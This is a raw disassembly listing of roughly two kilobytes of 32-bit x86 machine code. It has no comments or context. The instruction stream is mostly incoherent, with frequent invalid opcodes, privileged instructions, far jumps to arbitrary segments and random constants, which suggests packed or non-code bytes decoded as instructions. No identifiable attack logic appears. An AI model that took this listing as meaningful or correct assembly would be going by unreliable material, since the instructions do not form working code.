  422ef3:	mov    WORD PTR [esi-0x5ea75373],gs
  422ef9:	pop    esp
  422efa:	push   ebx
  422efb:	mov    esp,0xe031627d
  422f00:	xor    eax,0x9a09a069
  422f05:	mov    ds:0x93640bff,eax
  422f0a:	lock add edx,ebp
  422f0d:	mov    bl,ah
  422f0f:	inc    esi
  422f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f11:	and    ch,ch
  422f13:	mov    eax,0x385ac420
  422f18:	adc    BYTE PTR [edx-0x34],cl
  422f1b:	out    dx,eax
  422f1c:	xchg   esi,eax
  422f1d:	std    
  422f1e:	pop    esp
  422f1f:	(bad)  
  422f20:	int    0x7c
  422f22:	jno    0x422f5f
  422f24:	gs xchg ecx,eax
  422f26:	pop    eax
  422f27:	inc    edi
  422f28:	xchg   ecx,eax
  422f29:	inc    eax
  422f2a:	push   esp
  422f2b:	adc    al,0xc0
  422f2d:	fs jno 0x422f81
  422f30:	jg     0x422eea
  422f32:	jl     0x422ee2
  422f34:	in     al,0x4
  422f36:	jg     0x422eec
  422f38:	mov    esp,DWORD PTR [eax]
  422f3a:	cld    
  422f3b:	js     0x422ee0
  422f3d:	imul   ecx,esp,0x16
  422f40:	xor    al,0xfd
  422f42:	push   es
  422f43:	xor    dl,BYTE PTR [edx]
  422f45:	xchg   esp,eax
  422f46:	mov    dl,0x9d
  422f48:	popa   
  422f49:	mov    edi,DWORD PTR [ebx]
  422f4b:	aam    0xfe
  422f4d:	or     ch,al
  422f4f:	inc    eax
  422f50:	call   0x8310:0xfca2c2e3
  422f57:	push   eax
  422f58:	rcl    DWORD PTR [edi],cl
  422f5a:	wrmsr  
  422f5c:	jmp    0xbad2:0x591eb9e3
  422f63:	jge    0x422f78
  422f65:	mov    eax,ds:0xe25f4fb1
  422f6a:	mov    ah,0xa8
  422f6c:	mov    eax,ds:0x58bfd26f
  422f71:	fdiv   DWORD PTR [esi-0x8]
  422f74:	sub    al,0x9a
  422f76:	sub    ah,BYTE PTR [edi+0x50606520]
  422f7c:	fisubr DWORD PTR [edi]
  422f7e:	scas   eax,DWORD PTR es:[edi]
  422f7f:	push   esi
  422f80:	dec    ecx
  422f81:	or     ah,BYTE PTR [ebx+0x2b]
  422f84:	adc    al,0x68
  422f86:	ins    DWORD PTR es:[edi],dx
  422f87:	pop    edi
  422f88:	addr16 push 0xffffffcf
  422f8b:	sbb    DWORD PTR ds:0x8e02218a,ebx
  422f91:	mov    ebp,DWORD PTR [ecx-0x7973232d]
  422f97:	leave  
  422f98:	out    dx,al
  422f99:	inc    edx
  422f9a:	push   edx
  422f9b:	sub    BYTE PTR [edi-0x3a],ch
  422f9e:	int    0x70
  422fa0:	fcom   DWORD PTR [eax]
  422fa2:	stc    
  422fa3:	aam    0x7f
  422fa5:	xlat   BYTE PTR ds:[ebx]
  422fa6:	scas   eax,DWORD PTR es:[edi]
  422fa7:	mov    esi,0x22448f18
  422fac:	fwait
  422fad:	jb     0x422fdb
  422faf:	mov    DWORD PTR [ebx+0x7e36a951],eax
  422fb5:	ss and eax,0x21bf5fce
  422fbb:	dec    edi
  422fbc:	div    BYTE PTR [edi+0x28]
  422fbf:	mov    ah,0x94
  422fc1:	dec    esp
  422fc2:	scas   eax,DWORD PTR es:[edi]
  422fc3:	push   cs
  422fc4:	mov    BYTE PTR [eax],bh
  422fc6:	adc    DWORD PTR [esi-0x5],ebx
  422fc9:	mov    esp,0xbfa3859
  422fce:	ds mov cl,0xd7
  422fd1:	jmp    0x422fbb
  422fd3:	ins    DWORD PTR es:[edi],dx
  422fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fd5:	xchg   ebp,eax
  422fd6:	sbb    cx,0x2795
  422fdb:	jmp    0x422f7a
  422fdd:	pop    esp
  422fde:	cmc    
  422fdf:	ret    0x5680
  422fe2:	(bad)  
  422fe3:	loopne 0x422f81
  422fe5:	sbb    BYTE PTR [ebx-0x67],cl
  422fe8:	imul   ecx,DWORD PTR [esi+ebp*8-0x33],0x3828fd0a
  422ff0:	push   0xffffffa2
  422ff2:	mov    dh,0xa2
  422ff4:	daa    
  422ff5:	out    dx,eax
  422ff6:	jg     0x42302d
  422ff8:	jp     0x422fcd
  422ffa:	push   ds
  422ffb:	je     0x422f91
  422ffd:	sub    DWORD PTR [eax-0x4e],ebp
  423000:	lock mov esi,0x15661e41
  423006:	mov    ecx,0x642495c0
  42300b:	mov    ecx,0xc6106f62
  423010:	sub    ecx,DWORD PTR [ebx+ebx*1+0x5e2228b8]
  423017:	les    ebp,FWORD PTR [edi]
  423019:	dec    ebx
  42301a:	pop    esp
  42301b:	adc    DWORD PTR [esp+edx*2-0x54],ecx
  42301f:	push   ecx
  423020:	jecxz  0x422fd5
  423022:	shl    DWORD PTR [ebx-0x6f8d67a5],0x23
  423029:	cdq    
  42302a:	inc    ecx
  42302b:	popa   
  42302c:	or     ebp,DWORD PTR [edx+0x5eee012d]
  423032:	pop    edi
  423033:	cmc    
  423034:	lods   eax,DWORD PTR ds:[esi]
  423035:	jle    0x42307b
  423037:	sub    DWORD PTR [esi],ebx
  423039:	stc    
  42303a:	jb     0x423014
  42303c:	sbb    DWORD PTR [esi+0x1e5b6614],esp
  423042:	xor    cl,ch
  423044:	out    dx,al
  423045:	push   edx
  423046:	jecxz  0x422fe3
  423048:	xor    DWORD PTR [ebp+edi*2+0x613d7649],edi
  42304f:	jecxz  0x422fed
  423051:	xchg   ecx,eax
  423052:	xchg   esi,eax
  423053:	fimul  DWORD PTR [eax-0x203c4b55]
  423059:	(bad)  
  42305a:	dec    esp
  42305c:	pop    ebx
  42305d:	fimul  WORD PTR [edx-0x1b]
  423060:	ret    0xb94b
  423063:	cld    
  423064:	fcmove st,st(3)
  423066:	adc    BYTE PTR [esi],al
  423068:	test   eax,0x6a1da021
  42306d:	sbb    bh,BYTE PTR [edi-0x60]
  423070:	mov    WORD PTR [ebx-0x5f],ds
  423073:	jg     0x423026
  423075:	outs   dx,DWORD PTR ds:[esi]
  423076:	gs push edx
  423078:	sti    
  423079:	pop    ecx
  42307a:	(bad)  
  42307b:	in     eax,0x5
  42307d:	xchg   ecx,eax
  42307e:	adc    al,0x60
  423080:	xchg   esp,eax
  423081:	sub    al,0x12
  423083:	xor    edi,esp
  423085:	jno    0x423018
  423087:	inc    esp
  423088:	xor    al,0x6f
  42308a:	test   DWORD PTR [ebp+0x55],edi
  42308d:	or     eax,0x1d1eabb1
  423092:	push   esp
  423093:	sti    
  423094:	imul   ecx,DWORD PTR [edx-0x789c8eed],0xffffffb2
  42309b:	sub    al,BYTE PTR [eax]
  42309d:	lods   al,BYTE PTR ds:[esi]
  42309e:	mov    WORD PTR [edi-0x2b],gs
  4230a1:	test   eax,0xe9342a0c
  4230a6:	xchg   BYTE PTR [ebx],bh
  4230a8:	test   eax,0xca220545
  4230ad:	call   0x5aeb:0xb4a4a974
  4230b4:	retf   0x1ba4
  4230b7:	mov    bh,0x4c
  4230b9:	inc    edx
  4230ba:	(bad)  
  4230bb:	test   BYTE PTR [eax-0x18],bh
  4230be:	cdq    
  4230bf:	sbb    BYTE PTR [edx+ecx*2+0x27],bl
  4230c3:	js     0x4230ab
  4230c5:	fsub   st(5),st
  4230c7:	nop
  4230c8:	jne    0x42307f
  4230ca:	enterw 0xb9bb,0xf8
  4230cf:	fst    QWORD PTR [ebx]
  4230d1:	dec    ebx
  4230d2:	rol    DWORD PTR [eax+0x18],cl
  4230d5:	mov    eax,0xf20bda49
  4230da:	or     eax,0x82aff41c
  4230df:	int3   
  4230e0:	push   cs
  4230e1:	(bad)  
  4230e2:	loopne 0x423087
  4230e4:	ror    DWORD PTR [eax],cl
  4230e6:	mov    al,ds:0x667fd2b9
  4230eb:	repnz sbb DWORD PTR [ebx-0x5b],0xd
  4230f0:	(bad)  [ebp-0x11ec49a6]
  4230f6:	sub    eax,0x4e66eba8
  4230fb:	xor    eax,0x5e7de4e3
  423100:	adc    BYTE PTR [edi+0x6963b001],ch
  423106:	push   edx
  423107:	mov    ah,0xb4
  423109:	mov    eax,ds:0x706f68d2
  42310e:	pop    edi
  42310f:	fsubrp st(4),st
  423111:	ret    
  423112:	in     eax,0xb
  423114:	out    dx,eax
  423115:	out    0x6e,al
  423117:	idiv   DWORD PTR [ecx+esi*1+0x41c74be1]
  42311e:	pop    ebp
  42311f:	jae    0x423159
  423121:	or     edx,DWORD PTR [edi+0x56]
  423124:	push   ebp
  423125:	retf   0xfc4
  423128:	mul    BYTE PTR [edi]
  42312a:	jmp    0x823f1bc2
  42312f:	push   cs
  423130:	pop    ebx
  423131:	jno    0x423142
  423133:	outs   dx,BYTE PTR ds:[esi]
  423134:	stc    
  423135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423136:	stc    
  423137:	pop    ecx
  423138:	retf   0x4b7b
  42313b:	pop    edx
  42313c:	sbb    DWORD PTR [ebp-0x513036cd],esi
  423142:	repnz xor al,BYTE PTR [esi+0x70]
  423146:	push   esi
  423147:	sub    bl,BYTE PTR [edx]
  423149:	jmp    0xc795:0x91704958
  423150:	push   edi
  423151:	xchg   esp,eax
  423152:	neg    BYTE PTR [ebp+esi*8+0x34c521b0]
  423159:	sub    ch,0x1c
  42315c:	out    0xd7,al
  42315e:	push   0xffffffa8
  423160:	cdq    
  423161:	mov    eax,0xbacf279
  423166:	clc    
  423167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423168:	and    BYTE PTR [edi],0x15
  42316b:	jmp    0x29243fc7
  423170:	in     eax,0x1a
  423172:	mov    bl,0xf9
  423174:	mov    DWORD PTR [ebx+0x2d],esi
  423177:	pop    esi
  423178:	das    
  423179:	ja     0x42319d
  42317b:	out    dx,eax
  42317c:	mov    ?,WORD PTR [ebp+0x3a3409bb]
  423182:	shr    DWORD PTR [ecx-0x6301be59],0x15
  423189:	cmp    ebp,ebx
  42318b:	lods   eax,DWORD PTR ds:[esi]
  42318c:	scas   eax,DWORD PTR es:[edi]
  42318d:	std    
  42318e:	cs cdq 
  423190:	cli    
  423191:	cdq    
  423192:	mov    ebp,0xfb291ac1
  423197:	les    ebx,FWORD PTR es:[ebx]
  42319a:	jb     0x4231ec
  42319c:	xchg   esp,eax
  42319d:	mov    ds:0x78103312,al
  4231a2:	mov    ah,0xa2
  4231a4:	bound  edi,QWORD PTR [eax+0x7d]
  4231a7:	cmc    
  4231a8:	push   esi
  4231a9:	fdivr  DWORD PTR [eax+0x30]
  4231ac:	add    ax,WORD PTR [edi]
  4231af:	mov    WORD PTR [edi+0x12],cs
  4231b2:	loopne 0x42318f
  4231b4:	xchg   BYTE PTR [edi-0xd927481],cl
  4231ba:	aad    0x5b
  4231bc:	shl    BYTE PTR [ebp+0x5f],0xc4
  4231c0:	jns    0x4231c5
  4231c2:	lods   eax,DWORD PTR ds:[esi]
  4231c3:	(bad)  
  4231c5:	add    DWORD PTR [ebp+edx*1+0x477e9a8],ebx
  4231cc:	aaa    
  4231cd:	(bad)  
  4231ce:	stc    
  4231cf:	fmul   QWORD PTR es:[ebx-0x77bd1981]
  4231d6:	sbb    eax,0x8dffe8a8
  4231db:	(bad)  
  4231dc:	mov    DWORD PTR [ecx],esp
  4231de:	inc    esi
  4231df:	jecxz  0x4231c4
  4231e1:	mov    BYTE PTR [ebp+0x76876f9a],bh
  4231e7:	loop   0x42322a
  4231e9:	mov    esi,0x5d1acdfd
  4231ee:	push   ecx
  4231ef:	cli    
  4231f0:	out    dx,eax
  4231f1:	jo     0x4231f2
  4231f3:	mov    dl,0x8a
  4231f5:	xchg   ebx,eax
  4231f6:	push   0xaf3e982d
  4231fb:	pop    esp
  4231fc:	cmp    esi,DWORD PTR [edi]
  4231fe:	jno    0x4231d7
  423200:	jmp    0x9fac:0x1aadfad7
  423207:	iret   
  423208:	hlt    
  423209:	push   es
  42320a:	cmc    
  42320b:	out    dx,al
  42320c:	dec    eax
  42320d:	pop    ds
  42320e:	mov    bh,0x33
  423210:	pop    edx
  423211:	test   DWORD PTR [esi+0x45],eax
  423214:	cmp    bh,dh
  423216:	sbb    DWORD PTR [eax+ebp*4+0x2ed1ec8c],ecx
  42321d:	push   edi
  42321e:	mov    eax,DWORD PTR [ebp+0x76]
  423221:	sbb    ebp,DWORD PTR [edi+0x4f]
  423224:	pop    ebp
  423225:	adc    ah,BYTE PTR [edx]
  423227:	jb     0x423214
  423229:	add    DWORD PTR [edx+0x4],ecx
  42322c:	test   eax,0x198d94f6
  423231:	jno    0x423275
  423233:	and    eax,0x2e710b69
  423238:	nop
  423239:	push   ds
  42323a:	xchg   ecx,eax
  42323b:	sti    
  42323c:	fidivr WORD PTR [edx+0x4]
  42323f:	inc    ecx
  423240:	ror    DWORD PTR es:[eax],0x6c
  423244:	(bad)  
  423245:	mov    al,0x40
  423247:	dec    ebp
  423248:	addr16 fs mov edx,0x2c3bf28
  423250:	bound  ecx,QWORD PTR [ecx]
  423252:	and    al,0x2d
  423254:	in     eax,0x7f
  423256:	jge    0x423293
  423258:	sbb    BYTE PTR ds:0x8dc83fa1,cl
  42325e:	jp     0x4232c0
  423260:	sub    eax,0xc04c9a00
  423265:	mov    cl,BYTE PTR [eax-0x6a9bf75f]
  42326b:	and    DWORD PTR [ebx],edx
  42326d:	or     DWORD PTR [edx+esi*4-0x4f73bd05],esp
  423274:	jecxz  0x4232c7
  423276:	pop    esp
  423277:	or     edi,ecx
  423279:	push   eax
  42327a:	jae    0x42325b
  42327c:	lods   eax,DWORD PTR ds:[esi]
  42327d:	pop    eax
  42327e:	call   0x3f23:0x60f3114d
  423285:	andnps xmm0,XMMWORD PTR [edi+0x4c]
  423289:	es mov esi,0x30c9f425
  42328f:	ds add eax,0xfe0ba969
  423295:	jnp    0x42327d
  423297:	inc    esi
  423298:	dec    ebp
  423299:	fs mov ecx,0x62fe3244
  42329f:	inc    esi
  4232a0:	out    dx,al
  4232a1:	push   ds
  4232a2:	xchg   esp,eax
  4232a3:	dec    eax
  4232a4:	sub    BYTE PTR [ebx+0x36],cl
  4232a7:	shl    edi,cl
  4232a9:	sbb    al,dh
  4232ab:	or     dh,0x55
  4232ae:	(bad)  
  4232af:	push   0x5ab42bc2
  4232b4:	(bad)  
  4232b5:	retf   
  4232b6:	dec    ebx
  4232b7:	xchg   edx,eax
  4232b8:	mov    cs,WORD PTR [edx]
  4232ba:	fnstsw WORD PTR [ecx]
  4232bc:	xor    edi,DWORD PTR [esi+0x32c0ee49]
  4232c2:	add    ecx,edi
  4232c4:	aas    
  4232c5:	hlt    
  4232c6:	cmp    eax,0x95a4313a
  4232cb:	lock cli 
  4232cd:	pop    esp
  4232ce:	fisub  DWORD PTR [ebx+0x39892e67]
  4232d4:	jge    0x4232e5
  4232d6:	or     esp,DWORD PTR [eax-0x437e199e]
  4232dc:	mov    ebp,0xccaed309
  4232e1:	retf   
  4232e2:	mov    esp,0xa41bb304
  4232e7:	nop
  4232e8:	cmp    ch,dl
  4232ea:	call   0xfb40:0xe7581a9b
  4232f1:	fidivr DWORD PTR [edi+0x4d37cedd]
  4232f7:	lods   eax,DWORD PTR ds:[esi]
  4232f8:	out    0xe5,eax
  4232fa:	mov    ebx,0xcc351e01
  4232ff:	sbb    DWORD PTR [ebp+ebp*4+0x65447967],esp
  423306:	test   bl,dh
  423308:	xchg   esp,eax
  423309:	dec    ebp
  42330a:	jns    0x42333e
  42330c:	pop    es
  42330d:	ins    DWORD PTR es:[edi],dx
  42330e:	push   es
  42330f:	xchg   edx,eax
  423310:	fcom   QWORD PTR [edi+0x42]
  423313:	loope  0x423307
  423315:	xchg   esp,eax
  423316:	pop    ds
  423317:	mov    ch,0xa8
  423319:	cmp    DWORD PTR [ebx-0x1e],ebp
  42331c:	sbb    eax,0x80b38c62
  423321:	(bad)
  423324:	xor    eax,0x5ebebb0d
  423329:	ins    DWORD PTR es:[edi],dx
  42332a:	(bad)  
  42332b:	mov    dl,0x86
  42332d:	shl    bl,cl
  42332f:	mov    al,0x1b
  423331:	scas   al,BYTE PTR es:[edi]
  423332:	xchg   esi,eax
  423333:	sbb    BYTE PTR [esi+edx*1+0x22],bl
  423337:	push   cs
  423338:	mov    cl,0x33
  42333a:	inc    ebp
  42333b:	adc    esi,ebp
  42333d:	push   ss
  42333e:	cmp    edi,DWORD PTR [edx]
  423340:	pusha  
  423341:	sub    ebp,DWORD PTR [edx+edi*1+0x223ff99d]
  423348:	fnstcw WORD PTR [esi+0x4f99947]
  42334e:	lds    ebp,FWORD PTR [edx]
  423350:	xor    eax,0x873ca95
  423355:	(bad)  [ecx]
  423357:	xor    esi,DWORD PTR [ebp-0x41326114]
  42335d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42335e:	cld    
  42335f:	jecxz  0x4233a6
  423361:	js     0x423373
  423363:	inc    edi
  423364:	out    0x4c,eax
  423366:	mov    al,BYTE PTR [ecx]
  423368:	xlat   BYTE PTR gs:[ebx]
  42336a:	std    
  42336b:	es mov edi,0x25e9e243
  423371:	fcom   QWORD PTR [edi]
  423373:	test   eax,0x6d00bca3
  423378:	sti    
  423379:	fmul   QWORD PTR [edx-0x1d]
  42337c:	xor    eax,0xc5708cc0
  423381:	sbb    BYTE PTR [edi],0xd5
  423384:	adc    eax,0x32
  423387:	jnp    0x42330a
  423389:	popa   
  42338a:	push   ebx
  42338b:	add    al,BYTE PTR [eax]
  42338d:	mov    ebp,ecx
  42338f:	xchg   ebp,eax
  423390:	dec    edx
  423391:	mov    ecx,0xd851ec
  423396:	or     DWORD PTR [edx],ebp
  423398:	sbb    eax,0x86688d2e
  42339d:	sti    
  42339e:	adc    BYTE PTR [eax],0xfe
  4233a1:	pop    esp
  4233a2:	jno    0x4233d3
  4233a4:	sbb    DWORD PTR [edx],0xb6287586
  4233aa:	loop   0x423361
  4233ac:	mov    al,ds:0xdcc631bb
  4233b1:	jne    0x42338b
  4233b3:	fiadd  DWORD PTR [ecx+0x294a5fd8]
  4233b9:	sbb    eax,0xdf0af009
  4233be:	mov    esp,0x88f64d30
  4233c3:	fst    QWORD PTR [ecx]
  4233c5:	aam    0xc0
  4233c7:	mov    dl,0x4d
  4233c9:	rol    BYTE PTR [ebp+0x6676c126],cl
  4233cf:	jle    0x423434
  4233d1:	sti    
  4233d2:	ror    ebx,0xe9
  4233d5:	fcmovnbe st,st(3)
  4233d7:	cmc    
  4233d8:	xchg   ebx,eax
  4233d9:	out    0x55,eax
  4233db:	je     0x4233ce
  4233dd:	or     al,0xc2
  4233df:	sbb    DWORD PTR fs:[edx+edi*1+0x36],0xffffffd4
  4233e5:	xchg   esi,eax
  4233e6:	shr    DWORD PTR [edi+0x76],cl
  4233e9:	into   
  4233ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233ec:	xor    ecx,ebp
  4233ee:	lods   al,BYTE PTR ds:[esi]
  4233ef:	fild   DWORD PTR [esi-0x287ac6ee]
  4233f5:	pop    es
  4233f6:	imul   eax,DWORD PTR [edx-0x27cf0efd],0x99a93a89
  423400:	jmp    0xfcb1:0xf72a6afb
  423407:	sub    edi,ecx
  423409:	push   ecx
  42340a:	cmp    ch,al
  42340c:	xor    dh,BYTE PTR [ebx]
  42340e:	out    dx,eax
  42340f:	das    
  423410:	dec    DWORD PTR [esi-0x6a]
  423413:	push   es
  423414:	inc    ecx
  423415:	(bad)  
  423417:	test   al,0x45
  423419:	xacquire xchg DWORD PTR [esi],edi
  42341c:	aas    
  42341d:	nop
  42341e:	pop    esp
  42341f:	push   esp
  423420:	mov    ah,0x63
  423422:	xchg   ebp,eax
  423423:	sub    eax,0x8bf96995
  423428:	dec    esp
  423429:	xor    BYTE PTR [edx+0x52],ah
  42342c:	push   ecx
  42342d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42342e:	ja     0x423428
  423430:	cmp    eax,0x2c255a8e
  423435:	xchg   ebx,eax
  423436:	adc    DWORD PTR [edx+0x60d695a2],esp
  42343c:	rcr    BYTE PTR [edi],0x6d
  42343f:	ins    DWORD PTR es:[di],dx
  423441:	cmp    esi,ebp
  423443:	out    dx,al
  423444:	xchg   esi,ebx
  423446:	jg     0x4233f3
  423448:	cmc    
  423449:	xor    ah,dl
  42344b:	sub    al,0x2a
  42344d:	push   ecx
  42344e:	pop    es
  42344f:	sub    BYTE PTR cs:[edx-0x1b7a40b9],0xf0
  423457:	jl     0x4233eb
  423459:	repnz add eax,0x66dc96fa
  42345f:	or     DWORD PTR [esi],esi
  423461:	jecxz  0x423423
  423463:	inc    ebx
  423464:	mov    ebx,ebp
  423466:	test   eax,0xfdeba16b
  42346c:	bnd jne 0x4234aa
  42346f:	xor    ebp,DWORD PTR [ebx+ecx*8-0x5f]
  423473:	ja     0x4234c0
  423475:	scas   al,BYTE PTR es:[edi]
  423476:	les    edx,FWORD PTR [ebp+0x4f119046]
  42347c:	cmp    BYTE PTR [esi+0x26],ch
  42347f:	jnp    0x4234e1
  423481:	inc    eax
  423482:	mov    cl,0x81
  423484:	fisub  WORD PTR [ebx-0x75]
  423487:	ret    0x5b31
  42348a:	sub    BYTE PTR [ecx],0x50
  42348d:	cmp    esi,DWORD PTR [ebp+0x7c]
  423490:	pop    ds
  423491:	inc    ebp
  423492:	stos   DWORD PTR es:[edi],eax
  423493:	jb     0x423469
  423495:	sub    ah,BYTE PTR [ecx]
  423497:	int3   
  423498:	jo     0x42345a
  42349a:	push   eax
  42349b:	dec    ebp
  42349c:	push   ecx
  42349d:	and    DWORD PTR ds:0xb59c4088,esp
  4234a3:	sub    eax,0x21216ea5
  4234a8:	xor    eax,0xde38e54b
  4234ad:	xor    al,0xc7
  4234af:	pop    esp
  4234b0:	fs mov dh,0x2c
  4234b3:	pop    ss
  4234b4:	xor    ecx,DWORD PTR [edi+0x2f]
  4234b7:	fisubr WORD PTR [ecx-0x47]
  4234ba:	icebp  
  4234bb:	out    0x80,al
  4234bd:	stos   DWORD PTR es:[edi],eax
  4234be:	add    al,BYTE PTR [ecx+edi*1-0x1e01c1ad]
  4234c5:	(bad)  [esi]
  4234c7:	mov    dh,0xa2
  4234c9:	sbb    ecx,DWORD PTR [ecx]
  4234cb:	xor    dl,BYTE PTR [esi]
  4234cd:	or     BYTE PTR [edx-0x72],bl
  4234d0:	(bad)  
  4234d1:	scas   eax,DWORD PTR es:[edi]
  4234d2:	hlt    
  4234d3:	dec    ecx
  4234d4:	or     eax,0x33bec4a8
  4234d9:	mov    bl,0x2f
  4234db:	fst    QWORD PTR es:0xc34965cb
  4234e2:	popa   
  4234e3:	inc    edx
  4234e4:	mov    ecx,ecx
  4234e6:	adc    BYTE PTR [edx],ah
  4234e8:	ins    BYTE PTR es:[edi],dx
  4234e9:	inc    ecx
  4234ea:	iret   
  4234eb:	mov    al,0xc9
  4234ed:	inc    ebp
  4234ee:	or     eax,0x730f2e06
  4234f3:	mov    eax,0xb71baf07
  4234f8:	pop    ecx
  4234f9:	and    ebx,edi
  4234fb:	popa   
  4234fc:	in     al,dx
  4234fd:	int    0x7f
  4234ff:	push   ecx
  423500:	dec    esp
  423501:	popf   
  423502:	(bad)  
  423503:	dec    esp
  423504:	fistp  DWORD PTR [edi-0x2]
  423507:	test   esp,esi
  423509:	mov    dh,BYTE PTR [ebp-0x6]
  42350c:	jns    0x423553
  42350e:	cmc    
  42350f:	inc    ebp
  423510:	fs cmp edx,esp
  423513:	sub    BYTE PTR ds:0x826ec9b4,cl
  423519:	loope  0x42349b
  42351b:	rcl    ch,1
  42351d:	gs mov esp,0x4100a0bc
  423523:	repnz inc edi
  423525:	xor    DWORD PTR [edi],esp
  423527:	pop    ds
  423528:	es xchg ecx,eax
  42352a:	imul   ebx,ebx,0xffffffdd
  42352d:	cwde   
  42352e:	fidiv  DWORD PTR ds:0x4d31d198
  423534:	jle    0x423589
  423536:	hlt    
  423537:	xchg   edi,eax
  423538:	popf   
  423539:	add    eax,0xdd5094ac
  42353e:	jmp    0x423567
  423540:	xchg   DWORD PTR [ecx+0x29],edi
  423543:	mov    esp,0xc80f9058
  423548:	jbe    0x42351f
  42354a:	aaa    
  42354b:	not    DWORD PTR [edi]
  42354d:	(bad)  
  42354f:	loopne 0x42355c
  423551:	aad    0xb2
  423553:	sbb    eax,0x49a0c9a5
  423558:	icebp  
  423559:	push   eax
  42355a:	stos   BYTE PTR es:[edi],al
  42355b:	icebp  
  42355c:	mov    ch,0x58
  42355e:	or     eax,0x8dbc46f5
  423563:	xchg   edi,eax
  423564:	push   ecx
  423565:	dec    edi
  423566:	xchg   ebp,eax
  423567:	out    dx,eax
  423568:	cli    
  423569:	jl     0x423579
  42356b:	jg     0x423563
  42356d:	xchg   ecx,eax
  42356e:	and    ch,BYTE PTR [edi+0x62]
  423571:	pushf  
  423572:	mul    BYTE PTR [ebx-0x55]
  423575:	push   ebx
  423576:	sub    al,0xab
  423578:	cmc    
  423579:	mov    edx,0xed4650b
  42357e:	sub    al,BYTE PTR [ecx-0xc]
  423581:	bound  ebx,QWORD PTR [edi-0x348120f2]
  423587:	push   ds
  423588:	fstp   TBYTE PTR [ebp+0x2fdd5afa]
  42358e:	fsub   QWORD PTR [edx+0x5454e7e3]
  423594:	pop    ebp
  423595:	mul    DWORD PTR [esi-0x4c]
  423598:	pop    ecx
  423599:	out    dx,eax
  42359a:	pop    edi
  42359b:	aam    0x77
  42359d:	jle    0x42358b
  42359f:	ins    BYTE PTR es:[edi],dx
  4235a0:	out    0x4e,al
  4235a2:	cld    
  4235a3:	(bad)  
  4235a4:	jmp    0x62f2:0x50b4559e
  4235ab:	fwait
  4235ac:	mov    edx,0xeadf067
  4235b1:	xchg   ebp,eax
  4235b2:	dec    ebx
  4235b3:	aaa    
  4235b4:	(bad)  
  4235b5:	ds jae 0x4235df
  4235b8:	les    ebp,FWORD PTR [esi]
  4235ba:	icebp  
  4235bb:	push   ebx
  4235bc:	or     al,0x5c
  4235be:	in     eax,dx
  4235bf:	jg     0x42354d
  4235c1:	(bad)  
  4235c2:	fdivr  DWORD PTR [ecx+esi*8+0x4d]
  4235c6:	rol    DWORD PTR [esi+0x63468874],cl
  4235cc:	inc    esi
  4235cd:	(bad)  
  4235ce:	jo     0x423561
  4235d0:	dec    esi
  4235d1:	jp     0x4235f5
  4235d3:	daa    
  4235d4:	mov    eax,ds:0xa5640495
  4235d9:	sbb    DWORD PTR [edx-0x72f3291],esi
  4235df:	scas   eax,DWORD PTR es:[edi]
  4235e0:	adc    dh,cl
  4235e2:	jne    0x4235f8
  4235e4:	xchg   esi,eax
  4235e5:	sahf   
  4235e6:	jmp    0x3e82:0xbe5eb59e
  4235ed:	sar    BYTE PTR [ebx],0xf1
  4235f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235f1:	stos   BYTE PTR es:[edi],al
  4235f2:	jmp    0x423647
  4235f4:	pop    ecx
  4235f5:	pop    ds
  4235f6:	retf   0x3336
  4235f9:	ret    
  4235fa:	repz dec esp
  4235fc:	dec    edx
  4235fd:	cmp    DWORD PTR [ebp+0x0],eax
  423600:	dec    edx
  423601:	xor    DWORD PTR [ecx-0x78],edi
  423604:	push   esi
  423605:	cmp    eax,0xfc05b5a9
  42360a:	sbb    ah,BYTE PTR [esi+eiz*4+0x7a]
  42360e:	and    BYTE PTR [ecx],dh
  423610:	jo     0x4235bb
  423612:	adc    eax,0xe8cfa109
  423617:	jmp    0x42361e
  423619:	(bad)  
  42361a:	cwde   
  42361b:	and    esp,DWORD PTR ds:0xf672a01b
  423621:	or     eax,0xd61d1e7
  423626:	cmc    
  423627:	sub    BYTE PTR [esi+0x11],ah
  42362a:	sub    al,0xca
  42362c:	repnz std 
  42362e:	jmp    0x4f9b78b9
  423633:	in     eax,0x17
  423635:	inc    edi
  423636:	fadd   st,st(6)
  423638:	dec    esi
  423639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42363a:	add    BYTE PTR [ecx+0x2b5ce5ac],dh
  423640:	dec    edx
  423641:	jl     0x4235d4
  423643:	push   esi
  423644:	and    BYTE PTR [ebp-0x8],bh
  423647:	push   ecx
  423648:	xor    DWORD PTR [esi+eiz*1-0x6c],ecx
  42364c:	cmp    eax,esi
  42364e:	cmp    al,BYTE PTR [esi+0x29e30819]
  423654:	xchg   esi,eax
  423655:	pop    ebp
  423656:	pop    ebx
  423657:	test   DWORD PTR [edi-0x33],ecx
  42365a:	popf   
  42365b:	mov    ch,0x1f
  42365d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42365e:	sahf   
  42365f:	pusha  
  423660:	out    dx,eax
  423661:	sahf   
  423662:	sub    esi,DWORD PTR [ebx+0x30704625]
  423668:	dec    edx
  423669:	and    eax,0x6d79f87c
  42366e:	push   cs
  42366f:	xor    al,0x1a
  423671:	push   esp
  423672:	inc    ebp
  423673:	dec    eax
  423674:	adc    DWORD PTR [ebp+0x19],0x1d
  423678:	fincstp 
  42367a:	lock and ecx,eax
  42367d:	sub    dh,BYTE PTR [esi+0x1feef61c]
  423683:	popa   
  423684:	nop
  423685:	and    eax,0x28ab0d30
  42368a:	adc    BYTE PTR ds:0x77a00673,0xb3
  423691:	out    dx,al
  423692:	cmp    al,dl
  423694:	nop
  423695:	test   DWORD PTR [ecx+esi*1-0x23],0x8646b33a
  42369d:	mov    eax,0x9ca6c97e
  4236a2:	arpl   WORD PTR [eax],bx
  4236a4:	or     ebp,ecx
  4236a6:	stos   DWORD PTR es:[edi],eax
  4236a7:	push   edx
  4236a8:	xchg   ebp,eax
  4236a9:	lea    ebx,ds:0xf506230a
  4236af:	clc    
  4236b0:	js     0x42364e
  4236b2:	dec    ebp
  4236b3:	dec    ebp
  4236b4:	ins    BYTE PTR es:[edi],dx
